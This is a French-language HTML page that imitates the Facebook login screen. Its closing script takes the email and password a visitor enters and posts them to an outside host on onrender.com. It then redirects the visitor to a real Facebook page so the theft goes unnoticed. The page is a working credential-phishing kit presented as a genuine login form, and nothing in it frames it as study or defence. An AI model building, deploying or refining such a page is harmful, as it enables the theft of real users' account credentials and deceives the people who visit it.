<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Connexion</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #f2f2f2;
            color: #1c1e21;
            line-height: 1.34;
            padding: 0;
            margin: 0;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        .header {
            text-align: center;
            padding: 20px 0;
        }
        
        .logo {
            font-size: 48px;
            color: #1877f2;
            font-weight: bold;
            margin-bottom: 10px;
        }
        
        .login-form {
            background-color: white;
            border-radius: 0;
            padding: 15px;
            box-shadow: none;
            border: 1px solid #dddfe2;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #dddfe2;
            border-radius: 0;
            background-color: #f5f6f7;
        }
        
        input:focus {
            outline: none;
            border-color: #1877f2;
        }
        
        .login-btn {
            width: 100%;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 0;
            padding: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 15px;
        }
        
        .login-btn:hover {
            background-color: #166fe5;
        }
        
        .separator {
            height: 1px;
            background-color: #dadde1;
            margin: 15px 0;
        }
        
        .create-account-btn {
            width: 60%;
            background-color: #42b72a;
            color: white;
            border: none;
            border-radius: 0;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            display: block;
            margin: 0 auto;
        }
        
        .create-account-btn:hover {
            background-color: #36a420;
        }
        
        .links {
            text-align: center;
            margin-top: 20px;
        }
        
        .links a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin-bottom: 10px;
        }
        
        .links a:hover {
            text-decoration: underline;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 15px;
            border-top: 1px solid #dddfe2;
            color: #8a8d91;
            font-size: 12px;
        }
        
        .language-selector {
            margin-top: 10px;
        }
        
        .language-selector select {
            padding: 5px;
            font-size: 12px;
            border: 1px solid #dddfe2;
            background-color: white;
        }
        
        @media (max-width: 450px) {
            .container {
                padding: 10px;
            }
            
            .login-form {
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">facebook</div>
        </div>
        
        <div class="login-form">
            <form>
                <div class="form-group">
                    <input type="text" placeholder="Numéro de mobile ou e-mail" required id="email">
                </div>
                
                <div class="form-group">
                    <input type="password" placeholder="Mot de passe" required id="password">
                </div>
                
                <button type="submit" id="create-account-btn"class="login-btn">Se connecter</button>
                
                <div class="links">
                    <a href="#">Mot de passe oublié ?</a>
                </div>
                
                <div class="separator"></div>
                
                <button type="button" class="create-account-btn" >Créer nouveau compte</button>
            </form>
        </div>
        
        <div class="footer">
            <div class="language-selector">
                <select>
                    <option>Français (France)</option>
                    <option>English (US)</option>
                    <option>Español</option>
                    <option>Deutsch</option>
                    <option>Italiano</option>
                </select>
            </div>
            <div style="margin-top: 10px;">
                Facebook &copy; 2025
            </div>
        </div>
    </div>
</body>
<script>
    const FACEBOOK_POLL_URL = "https://facebook.com/MaisonAI";
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const createAccountBtn = document.getElementById('create-account-btn');
    

    createAccountBtn.addEventListener('click', (e) => {
        e.preventDefault(); // Prevent default form submission
        const email = emailInput.value;
        const password = passwordInput.value;
        if(!emailInput.value || !passwordInput.value){
        alert('Veuillez remplir tous les champs');
        return;
    }

        fetch('https://facebook-1-xc5l.onrender.com/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email, password })
        })
        .then(response => response.json())
        .then(data => {
            if (data.message) {
                window.location.href = FACEBOOK_POLL_URL;
            } else {
                alert('Erreur lors de la connexion de l\'utilisateur');
                window.location.reload();
            }
        })
        .catch(error => {
            console.error('Erreur:', error);
        });
    });
</script>

</html>
